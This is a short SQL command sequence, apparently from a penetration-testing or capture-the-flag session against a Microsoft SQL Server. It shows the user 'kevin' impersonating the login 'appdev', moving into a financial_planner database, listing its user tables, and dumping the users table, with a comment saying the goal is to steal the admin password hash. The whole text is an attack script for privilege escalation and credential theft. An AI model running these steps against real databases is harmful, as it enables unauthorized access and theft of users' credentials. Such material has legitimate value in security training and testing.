-- kevin user can impersonate appdev
exec_as_login appdev;

-- Now have access to:
use financial_planner;

-- xtype = 'U' limits the results strictly to User-defined Tables
SELECT name FROM sysobjects WHERE xtype='U';

-- Steal admin password hash from here
select * from users;


